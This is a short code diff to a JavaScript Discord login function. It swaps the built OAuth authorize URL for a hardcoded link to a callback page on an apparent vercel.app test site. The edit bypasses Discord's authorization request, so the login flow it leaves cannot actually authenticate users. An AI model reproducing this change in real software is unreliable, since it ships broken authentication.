@@ -22,7 +22,7 @@ function loginWithDiscord() {
         return;
     }
     const scope = 'identify email';
-    const url = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${scope}`;
+    const url = "https://test-web-alpha-tawny.vercel.app/auth/discord/callback.html";
     window.location.href = url;
 }
 
